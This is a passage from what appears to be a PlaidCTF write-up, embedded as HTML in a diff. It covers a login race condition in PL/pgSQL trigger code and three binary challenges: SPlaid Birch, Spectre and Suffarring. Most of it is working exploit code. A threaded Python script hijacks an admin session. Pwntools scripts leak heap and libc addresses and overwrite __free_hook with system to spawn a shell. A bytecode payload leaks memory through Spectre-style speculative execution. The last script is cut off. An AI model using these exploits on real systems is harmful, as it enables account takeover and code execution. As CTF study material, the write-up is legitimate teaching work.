+  uid <span class="hljs-keyword">uuid</span> PRIMARY <span class="hljs-keyword">KEY</span> <span class="hljs-keyword">DEFAULT</span> uuid_generate_v4(),
+  user_uid <span class="hljs-keyword">uuid</span>,
+  logged_in <span class="hljs-built_in">boolean</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">FALSE</span>
+);
+
+
+<span class="hljs-comment">---------- POST /login</span>
+
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> web.handle_post_login() <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">TRIGGER</span> <span class="hljs-keyword">AS</span> $$
+<span class="hljs-keyword">DECLARE</span>
+  form_username <span class="hljs-built_in">text</span>;
+  session_uid uuid;
+  form_user_uid uuid;
+  context jsonb;
+<span class="hljs-keyword">BEGIN</span>
+  <span class="hljs-keyword">SELECT</span>
+    web.get_form(NEW.uid, <span class="hljs-string">'username'</span>)
+  <span class="hljs-keyword">INTO</span> form_username;
+
+  <span class="hljs-keyword">SELECT</span>
+    web.get_cookie(NEW.uid, <span class="hljs-string">'session'</span>)::<span class="hljs-keyword">uuid</span>
+  <span class="hljs-keyword">INTO</span> session_uid;
+
+  <span class="hljs-keyword">SELECT</span>
+    uid
+  <span class="hljs-keyword">FROM</span>
+    web.user
+  <span class="hljs-keyword">WHERE</span>
+    username = form_username
+  <span class="hljs-keyword">INTO</span> form_user_uid;
+
+  IF form_user_uid IS NOT NULL
+  THEN
+    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> web.session (
+      uid,
+      user_uid,
+      logged_in
+    ) <span class="hljs-keyword">VALUES</span> (
+      <span class="hljs-keyword">COALESCE</span>(session_uid, uuid_generate_v4()),
+      form_user_uid,
+      <span class="hljs-literal">FALSE</span>
+    )
+    <span class="hljs-keyword">ON</span> CONFLICT (uid)
+      <span class="hljs-keyword">DO</span> <span class="hljs-keyword">UPDATE</span>
+      <span class="hljs-keyword">SET</span>
+        user_uid = form_user_uid,
+        logged_in = <span class="hljs-literal">FALSE</span>
+    <span class="hljs-keyword">RETURNING</span> uid
+    <span class="hljs-keyword">INTO</span> session_uid;
+
+    PERFORM web.set_cookie(NEW.uid, 'session', session_uid::text);
+    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
+  ELSE
+    PERFORM web.respond_with_redirect(NEW.uid, '/login');
+  <span class="hljs-keyword">END</span> <span class="hljs-keyword">IF</span>;
+
+  RETURN NEW;
+<span class="hljs-keyword">END</span>;
+$$ LANGUAGE plpgsql;
+
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> route_post_login
+  <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">INSERT</span>
+  <span class="hljs-keyword">ON</span> web.request
+  <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">EACH</span> <span class="hljs-keyword">ROW</span>
+  <span class="hljs-keyword">WHEN</span> (NEW.path = <span class="hljs-string">'/login'</span> <span class="hljs-keyword">AND</span> NEW.method = <span class="hljs-string">'POST'</span>)
+  <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">PROCEDURE</span> web.handle_post_login();
+
+  <span class="hljs-comment">---------- POST /login/password</span>
+
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> web.handle_post_login_password() <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">TRIGGER</span> <span class="hljs-keyword">AS</span> $$
+<span class="hljs-keyword">DECLARE</span>
+  form_password <span class="hljs-built_in">text</span>;
+  session_uid uuid;
+  success boolean;
+<span class="hljs-keyword">BEGIN</span>
+  <span class="hljs-keyword">SELECT</span>
+    web.get_cookie(NEW.uid, <span class="hljs-string">'session'</span>)::<span class="hljs-keyword">uuid</span>
+  <span class="hljs-keyword">INTO</span> session_uid;
+
+  IF session_uid IS NULL
+  THEN
+    PERFORM web.respond_with_redirect(NEW.uid, '/login');
+    RETURN NEW;
+  <span class="hljs-keyword">END</span> <span class="hljs-keyword">IF</span>;
+
+  <span class="hljs-keyword">SELECT</span>
+    web.get_form(NEW.uid, <span class="hljs-string">'password'</span>)
+  <span class="hljs-keyword">INTO</span> form_password;
+
+  IF form_password IS NULL
+  THEN
+    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
+    RETURN NEW;
+  <span class="hljs-keyword">END</span> <span class="hljs-keyword">IF</span>;
+
+  <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">EXISTS</span> (
+    <span class="hljs-keyword">SELECT</span>
+      *
+    <span class="hljs-keyword">FROM</span>
+      web.user usr
+        <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> web.session <span class="hljs-keyword">session</span>
+          <span class="hljs-keyword">ON</span> usr.uid = session.user_uid
+    <span class="hljs-keyword">WHERE</span>
+      session.uid = session_uid
+        <span class="hljs-keyword">AND</span> usr.password_hash = crypt(form_password, usr.password_hash)
+  )
+  <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">success</span>;
+
+  IF success
+  THEN
+    <span class="hljs-keyword">UPDATE</span> web.session
+    <span class="hljs-keyword">SET</span>
+      logged_in = <span class="hljs-literal">TRUE</span>
+    <span class="hljs-keyword">WHERE</span>
+      uid = session_uid;
+
+    PERFORM web.respond_with_redirect(NEW.uid, '/');
+  ELSE
+    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
+  <span class="hljs-keyword">END</span> <span class="hljs-keyword">IF</span>;
+
+  RETURN NEW;
+<span class="hljs-keyword">END</span>;
+$$ LANGUAGE plpgsql;
+
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> route_post_login_password
+  <span class="hljs-keyword">BEFORE</span> <span class="hljs-keyword">INSERT</span>
+  <span class="hljs-keyword">ON</span> web.request
+  <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">EACH</span> <span class="hljs-keyword">ROW</span>
+  <span class="hljs-keyword">WHEN</span> (NEW.path = <span class="hljs-string">'/login/password'</span> <span class="hljs-keyword">AND</span> NEW.method = <span class="hljs-string">'POST'</span>)
+  <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">PROCEDURE</span> web.handle_post_login_password();
+</code></pre><p>There is a <strong>Race Condition</strong> vulnerability.</p>
+<p>login process:</p>
+<ol class="list">
+<li><code>POST /login</code> set a uuid to the session and bind user with our input <code>username</code></li>
+<li><code>POST /login/password</code> find the user password in db with corresponding uuid in the session, and compare with our input <code>password</code></li>
+<li>if two passwords are the same, it will update <code>logged_in=TRUE</code></li>
+</ol>
+<p>if we run step 1 between step 2 and step 3, we can change our user to arbitrary user and pass the password authentication.</p>
+<p>exploit:</p>
+<pre class="hljs"><code><span class="hljs-string">'''
+1. LOGIN as kaibro
+2. POST /login with same `session` cookie but different username
+'''</span>
+
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> requests
+
+host = <span class="hljs-string">"http://triggered.pwni.ng:52856"</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">(user, sess)</span>:</span>
+    r = requests.get(host + <span class="hljs-string">"/logout"</span>, cookies={<span class="hljs-string">"session"</span>:sess})
+    setuser(user, sess)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setuser</span><span class="hljs-params">(user, sess)</span>:</span>
+    r = requests.post(host + <span class="hljs-string">"/login"</span>, data={<span class="hljs-string">"username"</span>: user}, cookies={<span class="hljs-string">"session"</span>:sess})
+    <span class="hljs-comment">#print(r.headers)</span>
+    <span class="hljs-comment">#print(r.text)</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(pwd, sess)</span>:</span>
+    r = requests.post(host + <span class="hljs-string">"/login/password"</span>, data={<span class="hljs-string">"password"</span>: pwd}, cookies={<span class="hljs-string">"session"</span>: sess})
+    print(r.headers)
+    print(r.text)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">"admin"</span> <span class="hljs-keyword">in</span> r.text:
+        print(<span class="hljs-string">"Fuckkkkkkk!"</span>)
+
+
+sess = <span class="hljs-string">"d505bb4f-343e-47e1-a589-aacb3a4f85c3"</span>
+user = <span class="hljs-string">"kaibro"</span>
+target = <span class="hljs-string">"admin"</span>
+pwd = <span class="hljs-string">"kaibro"</span>
+
+<span class="hljs-comment">#login(pwd, sess)</span>
+<span class="hljs-comment">#setuser(target, sess)</span>
+
+
+init(user, sess)
+time.sleep(<span class="hljs-number">1</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">job</span><span class="hljs-params">()</span>:</span>
+    login(pwd, sess)
+    time.sleep(<span class="hljs-number">1</span>)
+
+t = threading.Thread(target = job)
+
+t.start()
+
+setuser(target, sess)
+time.sleep(<span class="hljs-number">1</span>)
+
+t.join()
+
+print(<span class="hljs-string">"Done."</span>)
+
+</code></pre><p>if we login as admin, we can find out the flag:</p>
+<p class="img-container"><img src="https://i.imgur.com/7U7tbUd.png" alt=""></p>
+<h2 id="pwnable"><a class="header-link" href="#pwnable"></a>Pwnable</h2>
+<h3 id="splaid-birch"><a class="header-link" href="#splaid-birch"></a>SPlaid Birch</h3>
+<ul class="list">
+<li>SP_select can let us select a SP and show its value, but this function contains out-of-bound vulnerability.</li>
+<li>We can add two SPs and trigger the vulnerability to leak heap address.</li>
+<li>Create unsortbin.</li>
+<li>Fake a SP_struct pointer on heap and let the value points to the unsortbin, so that we can trigger the vulnerability to leak libc address contained in the unsortbin.</li>
+<li>Fake a SP_struct pointer on heap and let the value points to free_hook, so that we can trigger the vulnerability to modify free_hook to system using sp_isolate2.</li>
+<li>Conduct sp_add(0x6873,0x6873) twice to trigger free_hook(&#39;sh&#39;).</li>
+</ul>
+<p>flag : <code>PCTF{7r335_0n_h34p5_0n_7r335_0n_5l3470r}</code></p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> random
+host = <span class="hljs-string">'splaid-birch.pwni.ng'</span>
+port = <span class="hljs-number">17579</span>
+
+binary = <span class="hljs-string">"./splaid-birch"</span>
+context.binary = binary
+elf = ELF(binary)
+<span class="hljs-keyword">try</span>:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  log.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.system
+  log.success(<span class="hljs-string">"system_off = "</span>+hex(system_off))
+<span class="hljs-keyword">except</span>:
+  log.failure(<span class="hljs-string">"libc not found !"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_del</span><span class="hljs-params">(index)</span>:</span>
+  r.sendline(<span class="hljs-string">"1"</span>)
+  r.sendline(str(index))
+  <span class="hljs-keyword">pass</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_get</span><span class="hljs-params">(index)</span>:</span>
+  r.sendline(<span class="hljs-string">"2"</span>)
+  r.sendline(str(index))
+  <span class="hljs-keyword">pass</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_nth</span><span class="hljs-params">(index)</span>:</span>
+  r.sendline(<span class="hljs-string">"3"</span>)
+  r.sendline(str(index))
+  <span class="hljs-keyword">pass</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_select</span><span class="hljs-params">(index)</span>:</span>
+  r.sendline(<span class="hljs-string">"4"</span>)
+  r.sendline(str(index))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_add</span><span class="hljs-params">(index,data)</span>:</span>
+  r.sendline(<span class="hljs-string">"5"</span>)
+  r.sendline(str(index))
+  r.sendline(str(data))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_isolate</span><span class="hljs-params">(index,data)</span>:</span>
+  r.sendline(<span class="hljs-string">"6"</span>)
+  r.sendline(str(index))
+  r.sendline(str(data))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp_isolate2</span><span class="hljs-params">(index,data1,data2)</span>:</span>
+  r.sendline(<span class="hljs-string">"7"</span>)
+  r.sendline(str(index))
+  r.sendline(str(data1))
+  r.sendline(str(data2))
+
+<span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:
+  r = process([binary, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+
+<span class="hljs-keyword">else</span>:
+  r = remote(host ,port)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+  sp_add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0</span>)
+  sp_add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0</span>)
+  sp_select(<span class="hljs-number">531</span>)
+  heap = int(r.recvline()) - <span class="hljs-number">0x12f8</span>
+  print(<span class="hljs-string">"heap = {}"</span>.format(hex(heap)))
+  sp_select(<span class="hljs-number">0</span>)
+  r.recvline()
+  sp_add(<span class="hljs-number">0x13</span>,<span class="hljs-number">0</span>)
+  sp_add(<span class="hljs-number">0x14</span>,<span class="hljs-number">0</span>)
+  sp_add(<span class="hljs-number">0x1</span>,<span class="hljs-number">0</span>)
+  sp_add(<span class="hljs-number">0</span> ,heap+<span class="hljs-number">0x30b0</span>)
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">155</span>):
+    sp_add(<span class="hljs-number">0x20</span>+i ,<span class="hljs-number">0</span>)
+  sp_select(<span class="hljs-number">-1865</span>)
+  libc = int(r.recvline()) - <span class="hljs-number">0x3ebca0</span>
+  print(<span class="hljs-string">"libc = {}"</span>.format(hex(libc)))
+  sp_select(<span class="hljs-number">0</span>)
+  r.recvline()
+  free_hook = <span class="hljs-number">0x3ed8e8</span> + libc
+  realloc_hook = <span class="hljs-number">0x3ebc28</span> + libc
+  malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc
+
+  sp_add(<span class="hljs-number">0x200</span>,(-((heap+<span class="hljs-number">0x1500</span>)*<span class="hljs-number">2</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>)
+  sp_add(<span class="hljs-number">0x201</span>,<span class="hljs-number">0</span>)
+  sp_add(<span class="hljs-number">0x202</span>,free_hook<span class="hljs-number">-0x18</span>)
+  sp_isolate2(free_hook<span class="hljs-number">-0x18</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x202</span>)
+  magic = libc + <span class="hljs-number">0x4f322</span>
+  magic = libc + <span class="hljs-number">0x10a38c</span>
+  system = libc + <span class="hljs-number">0x00000000004f440</span>
+
+  sp_select(<span class="hljs-number">-941</span>)
+  sp_isolate2(system,<span class="hljs-number">0</span>,<span class="hljs-number">-941</span>)
+
+  sp_add(<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x6873</span>)
+  sp_add(<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x6873</span>)
+  r.recvline()
+  r.sendline(<span class="hljs-string">"ls"</span>)
+
+  r.interactive()
+
+</code></pre><h3 id="spectre"><a class="header-link" href="#spectre"></a>Spectre</h3>
+<p>According to <a href="https://github.com/Eugnis/spectre-attack">spectre-attack-exploit</a>, we know there must be a buffer[256 <em> 512] for testing access time. First, assign buffer[i </em> 512] for each i to prevent copy on write zero page problem, and flush out it from cache line. </p>
+<p>However, we do not have </p>
+<pre class="hljs"><code>``` can be used, but there are 32MB space we can use.
+Usually, L3 <span class="hljs-keyword">Cache</span> <span class="hljs-keyword">size</span> <span class="hljs-keyword">is</span> <span class="hljs-number">8</span>MB, so we can <span class="hljs-keyword">flush</span> <span class="hljs-keyword">out</span> the buffer <span class="hljs-keyword">from</span> <span class="hljs-keyword">by</span> accessing the other <span class="hljs-keyword">space</span> which <span class="hljs-keyword">is</span> <span class="hljs-keyword">far</span> away <span class="hljs-keyword">from</span> buffer.
+
+<span class="hljs-keyword">Second</span>, here <span class="hljs-keyword">is</span> 
+<span class="hljs-string">``</span><span class="hljs-string">`builtin_bc
+`</span><span class="hljs-string">``</span>.
+
+<span class="hljs-string">``</span><span class="hljs-string">`c
+signed __int64 __fastcall builtin_bc(unsigned __int64 a1)
+{
+  signed __int64 result; 
+
+  result = -1LL;
+  if ( *(_QWORD *)the_vm &gt; a1 )
+    result = *(unsigned __int8 *)(the_vm + a1 + 8);
+  return result;
+}
+</span></code></pre><p>We can use it for training speculative execution, pass argument with 
+<code>0 0 0 0x1018</code> sequentially. CPU do speculative execution and leak the value of </p>
+<pre class="hljs"><code>``` by following flow.
+
+
+```c
+a = builtin_bc(<span class="hljs-number">0x1018</span>)
+buffer[a*<span class="hljs-number">512</span>] = <span class="hljs-number">1</span>
+</code></pre><p>Then, just using </p>
+<pre class="hljs"><code>``` to get the access time of buffer <span class="hljs-keyword">and</span> store it <span class="hljs-keyword">in</span> output memory region. Analyze it <span class="hljs-keyword">and</span> known which <span class="hljs-keyword">is</span> spectre.
+
+<span class="hljs-comment">#### Exploitation</span>
+
+```python
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> random
+
+r = process([<span class="hljs-string">"./spectre"</span>,<span class="hljs-string">"flag"</span>])
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">combine</span><span class="hljs-params">(a,b)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(((b&amp;<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-number">3</span>)+(a&amp;<span class="hljs-number">7</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Epilogue</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Cdq</span><span class="hljs-params">(reg_dst, reg_src32d)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+combine(reg_dst, reg_src32d)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Sub</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">And</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Shl</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">5</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Shr</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">6</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Mov</span><span class="hljs-params">(reg_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)+combine(reg_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Movc</span><span class="hljs-params">(reg_dst, const32)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)+p8(reg_dst)+p32(const32)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Load</span><span class="hljs-params">(reg_dst, mem_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)+combine(reg_dst, mem_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Store</span><span class="hljs-params">(mem_dst, reg_src)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">10</span>)+combine(mem_dst, reg_src)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Builtin</span><span class="hljs-params">(reg_dst, func_num)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">11</span>)+combine(reg_dst, func_num)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Loop</span><span class="hljs-params">(reg, times, dest)</span>:</span>
+    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">12</span>)+p8((reg&amp;<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-number">3</span>)+p32(times)+p32(dest)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">access_init</span><span class="hljs-params">(target)</span>:</span>
+    <span class="hljs-keyword">return</span> Movc(<span class="hljs-number">0</span>, target) + Movc(<span class="hljs-number">5</span>, <span class="hljs-number">512</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">access_body</span><span class="hljs-params">(val)</span>:</span>
+    <span class="hljs-keyword">return</span> Movc(<span class="hljs-number">6</span>,val) + Store(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + Add(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">train_init</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> Movc(<span class="hljs-number">1</span>, array2)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">train_body</span><span class="hljs-params">()</span>:</span>
+    ret = <span class="hljs-string">''</span>
+
+    <span class="hljs-comment"># Training part</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
+        ret += Movc(<span class="hljs-number">0</span>, <span class="hljs-number">0x61</span>) + Builtin(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + Movc(<span class="hljs-number">2</span>, <span class="hljs-number">9</span>) + Shl(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + Add(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + Load(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)
+
+    <span class="hljs-comment"># Access which byte we want to leak</span>
+    ret += Movc(<span class="hljs-number">0</span>, <span class="hljs-number">0x1019</span>+<span class="hljs-number">2</span>) + Builtin(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + Movc(<span class="hljs-number">2</span>, <span class="hljs-number">9</span>) + Shl(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + Add(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + Load(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)
+    <span class="hljs-keyword">return</span> ret
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_time_init</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> Movc(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_time_body</span><span class="hljs-params">()</span>:</span>
+    ret = Movc(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) + Movc(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>) + Movc(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)
+    ret += Add(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>) + Add(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>) + Loop(<span class="hljs-number">3</span>, <span class="hljs-number">166</span>, len(code)+len(ret))
+    ret += Movc(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>) + Add(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) + Movc(<span class="hljs-number">3</span>,<span class="hljs-number">255</span>) + And(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) + Mov(<span class="hljs-number">4</span>,<span class="hljs-number">1</span>) + Movc(<span class="hljs-number">6</span>,<span class="hljs-number">9</span>) + Shl(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>) + Movc(<span class="hljs-number">6</span>,array2) + Add(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)
+    ret += Builtin(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) + Load(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + Builtin(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + Sub(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
+    ret += Movc(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>) + Shl(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>) + Add(<span class="hljs-number">4</span>, <span class="hljs-number">7</span>) + Store(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>) + Movc(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>) + Add(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>)
+    <span class="hljs-keyword">return</span> ret
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_loop</span><span class="hljs-params">(reg, cond, val)</span>:</span>
+    <span class="hljs-keyword">return</span> Loop(reg, cond, val);
+
+
+array2 = <span class="hljs-number">0x1800000</span>
+flush_use = <span class="hljs-number">0x800000</span>
+
+code = <span class="hljs-string">''</span>
+
+code += Movc(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)
+
+<span class="hljs-comment"># array2 is use to verify cache hit</span>
+<span class="hljs-comment"># Fist assign prevent copy on write zero page</span>
+code += access_init(array2)
+code += access_body(<span class="hljs-number">0x1</span>) + get_loop(<span class="hljs-number">0</span>, array2+<span class="hljs-number">0x7fff00</span>, len(code))
+
+code1 = code
+
+<span class="hljs-comment"># Flush out cache by accessing other mem</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+    code += access_init(flush_use)
+    code += access_body(i) + get_loop(<span class="hljs-number">0</span>, flush_use+<span class="hljs-number">0xffff00</span>, len(code))
+
+<span class="hljs-comment"># training speculative execution</span>
+code += Movc(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)
+code += (train_init() + train_body()) + Movc(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>) + Add(<span class="hljs-number">6</span>,<span class="hljs-number">5</span>) + Loop(<span class="hljs-number">6</span>,<span class="hljs-number">50</span><span class="hljs-number">-1</span>,len(code))
+
+<span class="hljs-comment"># Test access time with array2[i*512] for i in range(256)</span>
+code += test_time_init()
+code += test_time_body() + get_loop(<span class="hljs-number">5</span>, <span class="hljs-number">255</span>, len(code))
+
+code += Movc(<span class="hljs-number">6</span>, <span class="hljs-number">2048</span>) + Add(<span class="hljs-number">7</span>, <span class="hljs-number">6</span>) + get_loop(<span class="hljs-number">7</span>, <span class="hljs-number">0x800</span>, len(code1))
+code += Epilogue()
+
+payload = p64(len(code))+code
+
+<span class="hljs-comment"># output bytecodes</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">"code"</span>,<span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> file:
+    file.write(payload)
+
+<span class="hljs-comment"># analyze output</span>
+r.send(payload)
+data = r.recvall()
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">8</span>):
+    <span class="hljs-keyword">if</span>(u64(data[i:i+<span class="hljs-number">8</span>]) &lt; <span class="hljs-number">80</span>):
+        print(chr( (i/<span class="hljs-number">8</span> ) % <span class="hljs-number">256</span>), u64(data[i:i+<span class="hljs-number">8</span>]))
+
+
+r.interactive()
+</code></pre><h3 id="suffarring"><a class="header-link" href="#suffarring"></a>Suffarring</h3>
+<ul class="list">
+<li>There is a heap overflow at Recant Function when needle length is larger than haystack</li>
+<li>Overwrite the size to leak libc and heap address</li>
+<li>Overwrite the tcache&#39;s fd to malloc at __free_hook</li>
+<li>Modify __free_hook to system and get shell</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn import *
+
+<span class="hljs-comment">#r = process(["./suffarring"])</span>
+r = remote(<span class="hljs-string">"suffarring.pwni.ng"</span>, <span class="hljs-number">7361</span>)
+
+def <span class="hljs-keyword">add</span><span class="bash">(size,data):
+</span>    r.sendlineafter(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">"A"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(size))
+    r.sendafter(<span class="hljs-string">"?"</span>,data)
+
+def recant(idx,size,data):
+    r.sendlineafter(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">"R"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(idx))
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(size))
+    r.sendafter(<span class="hljs-string">"?"</span>,data)
+
+
+def remove(idx):
+    r.sendlineafter(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">"D"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(idx))
+
+def Print(idx):
+    r.sendlineafter(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">"P"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(idx))
+
+context.arch = <span class="hljs-string">"amd64"</span>
